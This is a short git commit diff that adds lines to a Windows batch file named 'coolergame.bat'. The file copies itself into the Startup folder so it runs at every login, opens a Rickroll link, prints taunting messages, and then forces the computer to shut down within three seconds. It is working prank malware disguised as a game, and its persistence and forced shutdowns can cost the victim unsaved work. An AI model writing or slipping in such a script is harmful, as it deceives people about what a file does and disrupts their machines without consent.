86ffb11b8c6992fecc3fe5cfa4d42aeb948303ca
Andy Jiang <andyjiang9999@gmail.com>
2022-07-23 21:11:12 +1000

    hmm

--- team/coolergame.bat
+++ team/coolergame.bat
@@ -1,2 +1,11 @@
+@echo off
+echo restart your computer lmao
+echo there's no escape
 copy /y %~f0 "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
 start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+pause
+echo initiaiting shutdown sequence...
+pause
+echo we know the game and we're gonna play it...
+pause
+shutdown -s -f -t 3 -c "have you ever considered closing the command prompt"
